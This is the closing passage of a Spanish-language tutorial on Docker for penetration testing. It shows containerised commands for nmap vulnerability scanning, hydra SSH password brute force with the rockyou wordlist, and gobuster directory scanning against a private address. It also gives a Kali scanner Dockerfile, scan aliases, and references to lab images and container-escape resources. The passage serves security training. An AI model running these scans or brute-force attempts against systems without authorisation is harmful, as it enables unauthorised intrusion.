docker run --rm --network host instrumentisto/nmap \
    -sV --script=vuln 192.168.1.100

# 4. Fuerza bruta de servicios
docker run --rm --network host --entrypoint hydra \
    kalilinux/kali \
    -l admin -P /usr/share/wordlists/rockyou.txt \
    ssh://192.168.1.100

# 5. Escaneo web con gobuster
docker run --rm --network host --entrypoint gobuster \
    kalilinux/kali \
    dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# 6. Dockerfile para escáner todo-en-uno
cat > Dockerfile.scanner << 'EOF'
FROM kalilinux/kali
RUN apt update && apt install -y --no-install-recommends \
    nmap \
    masscan \
    hydra \
    gobuster \
    dirb \
    nikto \
    whatweb \
    && rm -rf /var/lib/apt/lists/*
WORKDIR /data
EOF

docker build -t scanner -f Dockerfile.scanner .

# 7. Aliases
alias scan-net='docker run --rm --network host --cap-add NET_RAW scanner nmap -sn'
alias scan-ports='docker run --rm --network host --cap-add NET_RAW scanner nmap -sS -sV'
alias scan-web='docker run --rm --network host scanner nikto -h'

# Uso:
scan-net 192.168.1.0/24
scan-ports 192.168.1.100
scan-web http://192.168.1.100
```
</details>

---

## 13) Referencias

- **[docker](../raw/d0ck3r-f0r-h4ck3rs.md) Documentation:** [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://docs.[docker](../raw/d0ck3r-f0r-h4ck3rs.md).[com](../raw/w1n-s9bsyst3ms.md#com)/
- **Docker Security (official):** https://docs.docker.com/engine/security/
- **CIS Docker Benchmark:** https://www.cisecurity.org/benchmark/docker
- **Docker Bench Security:** https://github.com/docker/docker-bench-security
- **[owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) Docker Security:** https://[owasp](../raw/w3b-h4ck1ng.md#owasp-top-10).org/www-project-docker-security/
- **Vulhub (vulnerable environments):** https://vulhub.org/
- **DVWA Docker:** https://hub.docker.com/r/vulnerables/web-dvwa
- **Juice Shop:** https://hub.docker.com/r/bkimminich/juice-shop
- **WebGoat:** https://hub.docker.com/r/webgoat/goatandwolf
- **[metasploit](../raw/m3t4spl01t.md) Docker:** https://hub.docker.com/r/metasploitframework/[metasploit](../raw/m3t4spl01t.md)-framework
- **[container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) Escape Techniques (TrailOfBits):** https://blog.trailofbits.com/2019/07/19/understanding-docker-[container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores)-escapes/
- **Container Escape (CDK):** https://github.com/cdk-team/CDK
- **Linux [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities):** https://man7.org/linux/man-pages/man7/[capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities).7.html
- **Seccomp Docker:** https://docs.docker.com/engine/security/seccomp/
- **Secure Dockerfile Best Practices:** https://docs.docker.com/develop/dev-best-practices/
- **[nmap](../raw/nm4p.md) Docker:** https://hub.docker.com/r/instrumentisto/[nmap](../raw/nm4p.md)

---
*Fin del tutorial d0ck3r-f0r-h4ck3rs.md*


